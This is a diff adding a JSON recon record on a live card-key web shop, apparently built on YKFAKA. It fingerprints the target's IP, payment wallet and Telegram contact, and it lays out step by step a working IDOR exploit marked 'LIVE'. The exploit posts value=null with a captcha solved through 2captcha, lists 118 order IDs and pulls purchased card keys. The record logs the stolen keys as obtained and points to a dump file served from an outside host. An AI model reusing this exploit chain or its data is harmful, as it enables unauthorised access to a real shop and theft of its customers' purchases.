@@ -1,0 +1,37 @@
+{
+  "target": "https://fak86.top/",
+  "http_base": "http://fak86.top/",
+  "timestamp": "2026-08-04T17:30:00+08:00",
+  "fingerprint": {
+    "stack": "YKFAKA",
+    "title": "拾玥Q商城",
+    "ip": "24.233.15.253",
+    "tls": "cert CN=www.dfqq.xyz (SAN mismatch for fak86.top); use HTTP or -k",
+    "tg": "@uu6569",
+    "pay": ["udpay/USDT", "txpay/TRX"],
+    "usdt": "TJGhSHDkZqF9wATeYPsnVuEFAuGCrQ4qGx"
+  },
+  "success_cases": {
+    "mima1314_null": "HIT with Geetest — bare POST value=null => 请求非法; +geetest => list",
+    "qd93_rainbow": "N/A",
+    "79yj_api_search": "N/A (not rainbow)"
+  },
+  "vuln": {
+    "name": "YKFAKA Query.html value=null + Geetest → Query_Km IDOR",
+    "status": "LIVE",
+    "steps": [
+      "GET /Query.html → __token__; GET /Captcha → gt/challenge (success=1)",
+      "2captcha geetest solve",
+      "POST /Query.html value=null&page=1&__token__&geetest_*",
+      "parse 订单编号 / Query_Km/{12hex}; GET /Query_Km/{ddid}"
+    ],
+    "ddids_listed": 118,
+    "paid_with_kami": 9,
+    "unique_kami_lines": 7
+  },
+  "dump": {
+    "download": "http://103.185.249.13:18888/fak86_cards_20260804.tsv",
+    "hk_export": "/data/recon/exports/api_idor_fak86.top_20260804/"
+  },
+  "kami_obtained": true
+}
